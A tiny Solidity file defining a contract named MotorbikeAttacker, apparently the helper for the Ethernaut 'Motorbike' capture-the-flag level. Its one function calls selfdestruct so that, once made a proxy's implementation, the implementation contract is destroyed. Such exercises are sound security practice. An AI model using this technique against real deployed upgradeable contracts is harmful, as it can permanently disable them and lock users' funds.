// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

contract MotorbikeAttacker {
    function destroy(address _to) external {
        selfdestruct(payable(_to));
    }
}
